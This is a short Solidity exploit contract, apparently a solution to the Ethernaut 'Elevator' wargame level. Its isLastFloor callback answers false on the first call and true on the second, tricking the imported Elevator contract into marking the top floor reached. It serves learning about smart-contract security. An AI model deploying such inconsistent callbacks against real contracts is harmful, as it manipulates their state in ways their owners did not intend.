// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract Attacker {

  address payable target;
  address public deployer;
  uint count;

  constructor (address payable _target) public payable {
    target = _target;
    deployer = msg.sender;
  }

  function attack() public {
    count = 0;
    Elevator(target).goTo(10);
    }

  function isLastFloor (uint _floor) external returns (bool) {
    count += 1;
    if (count == 1) {return false;}
    else {return true;}
  }
}
